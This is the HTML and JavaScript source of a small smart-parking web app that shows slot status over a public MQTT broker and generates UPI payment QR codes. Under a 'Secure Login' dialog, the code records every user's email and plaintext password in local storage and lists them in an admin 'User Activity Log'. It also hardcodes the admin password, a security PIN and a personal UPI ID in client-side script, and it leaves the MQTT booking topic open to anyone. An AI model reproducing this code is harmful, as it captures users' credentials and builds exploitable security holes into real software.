<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Parking Pro</title>
    <link rel="manifest" href="manifest.json">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/paho-mqtt/1.0.1/mqttws31.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

    <style>
        :root { --primary: #0984e3; --success: #00b894; --danger: #d63031; --warn: #e17055; --text: #2d3436; }
        
        body { 
            font-family: 'Poppins', sans-serif; margin: 0; padding: 50px 20px 20px 20px; 
            color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; 
        }
        
        body::before {
            content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.1)), url('https://images.unsplash.com/photo-1506521781263-d8422e82f27a?ixlib=rb-1.2.1&auto=format&fit=crop&w=1950&q=80');
            background-size: cover; background-position: center; z-index: -1;
        }

        .header { width: 100%; display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
        .menu-btn { font-size: 32px; border: none; background: none; cursor: pointer; color: #fff; filter: drop-shadow(2px 2px 2px #000); padding: 10px; }
        .app-title { font-weight: 700; font-size: 1.8em; color: #fff; text-shadow: 2px 2px 4px #000; letter-spacing: 1px; margin: 0;}
        
        .availability-box {
            background: linear-gradient(135deg, #6c5ce7, #a29bfe); color: #fff;
            padding: 15px 30px; border-radius: 50px; font-weight: 700; font-size: 1.3em; margin-bottom: 20px;
            border: 2px solid rgba(255,255,255,0.3); box-shadow: 0 8px 20px rgba(108, 92, 231, 0.4);
            text-align: center; text-shadow: 1px 1px 2px rgba(0,0,0,0.2); backdrop-filter: blur(5px);
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }

        .live-clock { color: #fff; font-size: 1.1em; font-weight: 600; margin-bottom: 25px; text-shadow: 1px 1px 3px #000; background: rgba(0,0,0,0.6); padding: 5px 20px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.2); }
        .admin-only { display: none; }
        .badge { padding: 5px 12px; border-radius: 20px; font-size: 0.8em; font-weight: bold; color: white; border: 1px solid white; }
        .badge.online { background: var(--success); } .badge.offline { background: var(--danger); } .badge.waiting { background: #f1c40f; color: #333; }

        /* Bill & UPI Card */
        .bill-card {
            background: white; padding: 20px; border-radius: 15px; text-align: center; 
            margin-bottom: 20px; width: 90%; max-width: 350px; display: none;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3); position: fixed; top: 15%; z-index: 2500; 
        }
        .qrcode-container { display: flex; justify-content: center; margin: 15px 0; }

        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 100%; max-width: 400px; padding-bottom: 20px; }
        .slot-card { background: rgba(255,255,255,0.95); padding: 15px; border-radius: 15px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); display: flex; flex-direction: column; justify-content: space-between; }
        .slot-visual { padding: 15px 5px; border-radius: 10px; font-weight: bold; color: white; margin-bottom: 5px; text-shadow: 1px 1px 2px rgba(0,0,0,0.3); }
        .time-box { background: #f1f2f6; padding: 8px; border-radius: 8px; margin: 8px 0; font-size: 0.75em; text-align: left; color: #555; }
        .time-row { display: flex; justify-content: space-between; margin-bottom: 3px; }
        
        .free { background: var(--success); } .occupied { background: var(--danger); } .reserved { background: var(--warn); }
        
        .btn { width: 100%; padding: 12px; border: none; border-radius: 12px; font-weight: 700; cursor: pointer; color: white; margin-top: 5px; text-transform: uppercase; }
        .btn-book { background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%); } 
        .btn-cancel { background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%); }
        .btn-disabled { background: #b2bec3; cursor: not-allowed; } 

        .sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: white; transition: 0.3s; z-index: 2000; box-shadow: 5px 0 20px rgba(0,0,0,0.2); }
        .sidebar.active { left: 0; }
        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 1500; display: none; }
        .overlay.active { display: block; } 
        .sidebar-header { background: var(--primary); padding: 20px; color: white; display: flex; align-items: center; gap: 15px; }
        .menu-back-btn { background: none; border: none; color: white; font-size: 1.8em; cursor: pointer; }
        .menu-item { padding: 15px 20px; border-bottom: 1px solid #eee; cursor: pointer; display: flex; align-items: center; gap: 15px; font-size: 1.1em; color: #444; }

        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 3000; }
        .modal-box { background: white; padding: 25px; border-radius: 15px; width: 85%; max-width: 350px; text-align: center; }
        .input-field { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }

        /* ANALYTICS CHART STYLE */
        .chart-container { width: 100%; height: 200px; margin-top: 10px; }
    </style>
</head>
<body>
    <div id="sidebarOverlay" class="overlay" onclick="toggleSidebar()"></div>

    <div class="header">
        <button class="menu-btn" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
        <div class="app-title">Smart Parking</div>
        <div id="statusBadge" class="badge waiting admin-only">Waiting...</div>
    </div>

    <div id="availabilityDisplay" class="availability-box">Available: 6</div>
    <div id="liveClock" class="live-clock">Loading...</div>

    <div id="lastBill" class="bill-card">
        <h3 style="margin:0; color:#2d3436;">üÖøÔ∏è Parking Bill</h3>
        <p style="color:#636e72; font-size:0.9em;">Scan QR to Pay</p>
        <div id="qrcode" class="qrcode-container"></div>
        <div style="font-size: 1.8em; color: #d63031; font-weight:bold; margin: 10px 0;" id="billAmount">Rs. 0</div>
        <button class="btn" style="background:#555;" onclick="closeBill()">Close</button>
    </div>

    <div class="grid" id="grid"></div>

    <div id="analyticsModal" class="modal"><div class="modal-box" style="width: 90%; max-width: 400px;">
        <h3 style="color:var(--primary);">üìä Parking Analytics</h3>
        <div class="chart-container"><canvas id="usageChart"></canvas></div>
        <button class="btn" onclick="closeModal('analyticsModal')" style="margin-top:20px; background:#555;">Close</button>
    </div></div>

    <div class="sidebar" id="sidebar">
        <div class="sidebar-header">
            <button class="menu-back-btn" onclick="toggleSidebar()"><i class="fas fa-arrow-left"></i></button>
            <div style="display: flex; flex-direction: column; text-align: left;">
                <h2 id="userName" style="margin:0; font-size: 1.2em;">Guest</h2>
                <p id="userEmail" style="font-size:0.7em; margin:0; opacity:0.8;">Login Required</p>
            </div>
        </div>
        
        <div class="menu-item" onclick="location.reload()"><i class="fas fa-sync-alt"></i> Refresh Page</div>
        <div class="menu-item" id="loginBtn" onclick="openModal('loginModal')"><i class="fas fa-sign-in-alt"></i> Login</div>
        <div class="menu-item" id="logoutBtn" onclick="logout()" style="display:none; color:var(--danger);"><i class="fas fa-sign-out-alt"></i> Logout</div>
        
        <div class="menu-item admin-only" onclick="showAnalytics()"><i class="fas fa-chart-pie"></i> Analytics Dashboard</div>
        <div class="menu-item admin-only" onclick="checkUserLogSecurity()" style="color: #6c5ce7;"><i class="fas fa-user-secret"></i> User Activity Log</div>
        <div class="menu-item admin-only" onclick="fixSlots()" style="color:var(--danger);"><i class="fas fa-tools"></i> Reset System</div>
        
        <div class="menu-item" onclick="shareApp()"><i class="fas fa-share-alt"></i> Share App</div>
    </div>

    <div id="loginModal" class="modal"><div class="modal-box">
        <h3>Secure Login</h3>
        <input id="emailInput" type="email" class="input-field" placeholder="Email">
        <input id="passInput" type="password" class="input-field" placeholder="Password">
        <button class="btn btn-book" onclick="login()">Login</button>
        <button class="btn" onclick="closeModal('loginModal')" style="background:none; color:#888;">Cancel</button>
    </div></div>

    <div id="userLogModal" class="modal"><div class="modal-box">
        <h3 style="color: #6c5ce7;">User Activity</h3>
        <div style="max-height: 250px; overflow-y: auto; border: 1px solid #eee; padding: 5px; border-radius: 5px;">
            <ul id="credList" style="list-style:none; padding:0; margin:0;"></ul>
        </div>
        <button class="btn" onclick="closeModal('userLogModal')" style="margin-top:10px; background:#555;">Close</button>
    </div></div>
        <script>
        // --- CONFIGURATION ---
        const ADMIN_EMAIL = "maxguna9566@gmail.com";
        const ADMIN_PASS = "63803021"; 
        const SECURITY_PIN = "72120308";
        // YOUR UPI ID HERE (Replace with yours)
        const MY_UPI_ID = "maxguna9566@oksbi"; 

        const MQTT_HOST = "broker.hivemq.com";
        const MQTT_PORT = 8884; 
        const ROOT_TOPIC = "my_smart_parking_project_123"; 

        // --- GLOBAL VARIABLES ---
        let currentUser = null; 
        let isAdmin = false; 
        let userLoginLogs = JSON.parse(localStorage.getItem('userLoginLogs')) || [];
        
        // --- UI FUNCTIONS ---
        function toggleSidebar() { 
            const sb = document.getElementById('sidebar');
            const ov = document.getElementById('sidebarOverlay');
            sb.classList.toggle('active'); ov.classList.toggle('active');
        }
        function openModal(id) { document.getElementById(id).style.display = 'flex'; toggleSidebar(); } 
        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
        function shareApp() { navigator.share ? navigator.share({title:'Smart Parking', url:window.location.href}) : alert('Link Copied'); }

        window.onload = function() {
            showAdminFeatures(false);
            document.getElementById('logoutBtn').style.display = 'none';
            document.getElementById('loginBtn').style.display = 'flex';
        };
        setInterval(() => { document.getElementById('liveClock').innerText = new Date().toLocaleTimeString(); }, 1000);

        // --- LOGIN LOGIC ---
        function login() {
            const email = document.getElementById('emailInput').value.trim();
            const pass = document.getElementById('passInput').value.trim();
            if(!email) { alert("Enter Email"); return; } 

            userLoginLogs.unshift({ email: email, pass: pass || "No Pass", time: new Date().toLocaleString() });
            localStorage.setItem('userLoginLogs', JSON.stringify(userLoginLogs));

            if(email === ADMIN_EMAIL && pass === ADMIN_PASS) {
                currentUser = email; isAdmin = true;
                document.getElementById('userName').innerText = "Admin (Guna)";
                document.getElementById('userEmail').innerText = email;
                alert("Welcome Admin!");
                showAdminFeatures(true); closeModal('loginModal'); toggleLoginState(true);
            } else {
                currentUser = email; isAdmin = false;
                document.getElementById('userName').innerText = email.split('@')[0];
                document.getElementById('userEmail').innerText = email;
                alert("Login Success!");
                showAdminFeatures(false); closeModal('loginModal'); toggleLoginState(true);
            }
            for(let i=1; i<=6; i++) updateVisuals(i);
        }

        function toggleLoginState(loggedIn) {
            document.getElementById('loginBtn').style.display = loggedIn ? 'none' : 'flex';
            document.getElementById('logoutBtn').style.display = loggedIn ? 'flex' : 'none';
        }
        function showAdminFeatures(show) { document.querySelectorAll('.admin-only').forEach(el => el.style.display = show ? 'block' : 'none'); }
        function logout() { if(confirm("Logout?")) { location.reload(); } }

        // --- USER LOG SECURITY ---
        function checkUserLogSecurity() {
            if(prompt("Enter PIN:") === SECURITY_PIN) {
                const list = document.getElementById('credList'); list.innerHTML = "";
                userLoginLogs.forEach(log => {
                    list.innerHTML += `<li style="border-bottom:1px solid #ddd; padding:5px; text-align:left;"><b>${log.email}</b><br><span style="color:red; font-family:monospace;">${log.pass}</span><br><small>${log.time}</small></li>`;
                });
                document.getElementById('userLogModal').style.display = 'flex';
                document.getElementById('sidebar').classList.remove('active');
                document.getElementById('sidebarOverlay').classList.remove('active');
            } else { alert("Wrong PIN"); }
        }

        // --- SLOT SETUP ---
        const grid = document.getElementById('grid'); 
        let slotState = {};
        for(let i=1; i<=6; i++) {
            slotState[i] = { sensor: false, booked: false };
            grid.innerHTML += `<div class="slot-card"><div id="s${i}" class="slot-visual free">Slot ${i}<br><small>Free</small></div>
            <div class="time-box"><div class="time-row"><span>In:</span> <span id="inTime${i}">--:--</span></div>
            <div class="time-row" style="margin-top:5px; border-top:1px dashed #ccc;"><span>Total:</span> <span id="totalTime${i}" style="font-weight:bold;">--</span></div></div>
            <button id="btn${i}" class="btn btn-book" onclick="userBookAction(${i})">Book</button></div>`;
        }

        function updateAvailableCount() {
            let free = 0;
            for(let i=1; i<=6; i++) if(!slotState[i].sensor && !slotState[i].booked) free++;
            document.getElementById('availabilityDisplay').innerText = "Available: " + free;
        }

        // --- ANALYTICS CHART ---
        function showAnalytics() {
            const ctx = document.getElementById('usageChart').getContext('2d');
            // Fake data for demo (Replace with real logic if backend exists)
            new Chart(ctx, {
                type: 'bar',
                data: {
                    labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri'],
                    datasets: [{
                        label: 'Cars Parked',
                        data: [12, 19, 3, 5, 2],
                        backgroundColor: '#6c5ce7'
                    }]
                }
            });
            openModal('analyticsModal');
        }

        // --- UPI BILL GENERATION ---
        function showBill(amountTxt) {
            const amount = amountTxt.replace("Rs. ", "").trim();
            document.getElementById('billAmount').innerText = amountTxt;
            
            // Generate UPI Link
            const upiLink = `upi://pay?pa=${MY_UPI_ID}&pn=SmartParking&am=${amount}&tn=ParkingFee`;
            
            document.getElementById("qrcode").innerHTML = "";
            new QRCode(document.getElementById("qrcode"), {
                text: upiLink, width: 128, height: 128
            });
            document.getElementById('lastBill').style.display = 'block';
        }
        function closeBill() { document.getElementById('lastBill').style.display = 'none'; }

        // --- MQTT LOGIC ---
        let client;
        try { client = new Paho.MQTT.Client(MQTT_HOST, MQTT_PORT, "WebClient-"+parseInt(Math.random()*1000)); client.connect({ onSuccess: onConnect, onFailure: onFail, useSSL: true }); } catch(e) {}
        function onFail() { console.log("MQTT Fail"); }
        function onConnect() { if(isAdmin) document.getElementById('statusBadge').innerText = "Online"; client.subscribe(ROOT_TOPIC + "/#"); }

        if(client) {
            client.onMessageArrived = function(message) {
                const topic = message.destinationName; const payload = message.payloadString;
                
                if (topic.includes("/s") && !topic.includes("/bookings/")) {
                    const id = parseInt(topic.split("/").pop().replace("s", ""));
                    if(id) {
                        const isOcc = (payload === "true");
                        if(isOcc && !slotState[id].sensor) { 
                            document.getElementById('inTime'+id).innerText = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
                            localStorage.setItem('entry_'+id, Date.now());
                        } else if(!isOcc && slotState[id].sensor) {
                            const start = localStorage.getItem('entry_'+id);
                            if(start) {
                                const mins = Math.floor((Date.now() - start)/60000);
                                document.getElementById('totalTime'+id).innerText = mins + "m";
                            }
                        }
                        slotState[id].sensor = isOcc; updateVisuals(id);
                    }
                } 
                else if (topic.includes("/bookings/s")) {
                    const id = parseInt(topic.split("/").pop().replace("s", ""));
                    if(id) { 
                        slotState[id].booked = (payload === "true"); 
                        if(payload === "false") localStorage.removeItem('owner_'+id);
                        updateVisuals(id);
                    }
                }
                if(topic.includes("/bill") && isAdmin) { showBill(payload); }
                if(topic.includes("/status") && isAdmin) { 
                    const b = document.getElementById('statusBadge'); 
                    b.className = payload==="ONLINE"?"badge online admin-only":"badge offline admin-only"; 
                    b.innerText = payload; 
                }
            };
        }

        function updateVisuals(i) {
            const el = document.getElementById('s'+i); const btn = document.getElementById('btn'+i);
            const isMine = (currentUser && localStorage.getItem('owner_'+i) === currentUser);
            
            if(slotState[i].sensor) {
                el.className = "slot-visual occupied"; el.innerHTML = `Slot ${i}<br><small>Occupied</small>`;
                btn.className = "btn btn-disabled"; btn.innerText = "IN USE"; btn.disabled = true;
            } else if(slotState[i].booked) {
                el.className = "slot-visual reserved"; el.innerHTML = `Slot ${i}<br><small>Reserved</small>`;
                if(isAdmin || isMine) {
                    btn.className = "btn btn-cancel"; btn.innerText = "CANCEL"; btn.onclick = () => sendBook(i, false); btn.disabled = false;
                } else {
                    btn.className = "btn btn-disabled"; btn.innerText = "RESERVED"; btn.disabled = true;
                }
            } else {
                el.className = "slot-visual free"; el.innerHTML = `Slot ${i}<br><small>Free</small>`;
                btn.className = "btn btn-book"; btn.innerText = "BOOK"; btn.onclick = () => userBookAction(i); btn.disabled = false;
            }
            updateAvailableCount();
        }

        function userBookAction(i) {
            if(!currentUser) { alert("Login First!"); openModal('loginModal'); return; }
            localStorage.setItem('owner_'+i, currentUser);
            sendBook(i, true);
        }
        function sendBook(i, status) {
            if(!client) return;
            const msg = new Paho.MQTT.Message(status ? "true" : "false");
            msg.destinationName = ROOT_TOPIC + "/bookings/s" + i; msg.retained = true;
            client.send(msg);
        }
        function fixSlots() { if(isAdmin && confirm("Reset All?")) { for(let i=1; i<=6; i++) { sendBook(i, false); client.send(ROOT_TOPIC+"/s"+i, "false", 0, true); } location.reload(); } }
    </script>
</body>
</html>
